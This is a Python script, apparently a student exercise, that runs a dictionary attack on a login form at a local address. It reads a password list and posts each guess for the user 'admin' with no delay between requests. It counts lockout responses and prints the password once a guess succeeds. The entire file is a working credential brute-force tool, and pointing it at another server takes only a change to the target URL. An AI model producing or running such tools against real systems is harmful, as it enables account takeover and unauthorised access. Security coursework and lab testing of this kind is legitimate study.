import requests
import time

# Configuration
TARGET_URL = "http://127.0.0.1:4500/login"
USERNAME = "admin"
PASSWORD_FILE = "/home/dawng/Desktop/Code/school/python/anm/passwords.txt"
DELAY = 0  # No delay - maximum speed

def load_passwords(file_path):
    """Load passwords from dictionary file"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"Error: Password file not found at {file_path}")
        return []

def attempt_login(username, password):
    """Attempt to login with given credentials"""
    try:
        response = requests.post(
            TARGET_URL,
            json={"username": username, "password": password},
            timeout=5
        )
        return response.json(), response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return None, None

def dictionary_attack():
    """Perform dictionary attack"""
    print(f"{'='*60}")
    print(f"Dictionary Attack Tool")
    print(f"{'='*60}")
    print(f"Target: {TARGET_URL}")
    print(f"Username: {USERNAME}")
    print(f"Dictionary: {PASSWORD_FILE}")
    print(f"{'='*60}\n")
    
    # Load passwords
    passwords = load_passwords(PASSWORD_FILE)
    if not passwords:
        return
    
    print(f"Loaded {len(passwords)} passwords from dictionary\n")
    print(f"Starting attack...\n")
    
    attempt_count = 0
    start_time = time.time()
    locked_count = 0
    
    for password in passwords:
        attempt_count += 1
        
        # Attempt login
        result, status_code = attempt_login(USERNAME, password)
        
        if result is None:
            continue
        
        # Print attempt info
        print(f"[{attempt_count:04d}] Testing: {password:20s} ", end='')
        
        if result.get('status') == 'success':
            print(f"✓ SUCCESS!")
            print(f"\n{'='*60}")
            print(f"PASSWORD FOUND!")
            print(f"{'='*60}")
            print(f"Username: {USERNAME}")
            print(f"Password: {password}")
            print(f"{'='*60}\n")
            break
        elif 'locked' in result.get('message', '').lower() or status_code == 403:
            print(f"✗ LOCKED")
            locked_count += 1
            if locked_count >= 3:
                print(f"\n{'='*60}")
                print(f"IP ADDRESS BLOCKED!")
                print(f"{'='*60}")
                print(f"Your IP has been locked by the server.")
                print(f"The attack has been stopped.")
                print(f"Wait 5 minutes before trying again.")
                print(f"{'='*60}\n")
                break
        else:
            print(f"✗ Failed")
        
        # Delay between requests
        time.sleep(DELAY)
    
    else:
        print(f"\n{'='*60}")
        print(f"Password not found in dictionary")
        print(f"{'='*60}\n")
    
    # Statistics
    elapsed_time = time.time() - start_time
    print(f"Statistics:")
    print(f"Total attempts: {attempt_count}")
    print(f"Time elapsed: {elapsed_time:.2f} seconds")
    print(f"Average rate: {attempt_count/elapsed_time:.2f} attempts/second")

if __name__ == "__main__":
    try:
        dictionary_attack()
    except KeyboardInterrupt:
        print(f"\n\nAttack interrupted by user")
    except Exception as e:
        print(f"\nError: {e}")
